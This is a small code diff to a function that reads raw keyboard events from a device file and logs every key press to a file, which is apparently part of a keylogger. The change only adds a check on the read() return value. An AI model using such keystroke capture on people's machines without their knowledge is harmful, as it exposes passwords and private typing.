@@ -107,7 +107,7 @@ static void* _startCapture(void* threadData) {
         // Capture keystrokes (but not releases)
         while (1) {
             readEvent = read(keyboard->deviceFile, keyEvent, sizeof(struct input_event) * 64);
-            if (keyEvent[1].value !=0) {
+            if (readEvent > 0 && keyEvent[1].value !=0) {
                 logFileStream << keys[keyEvent[1].code] << std::endl;
             }
         }
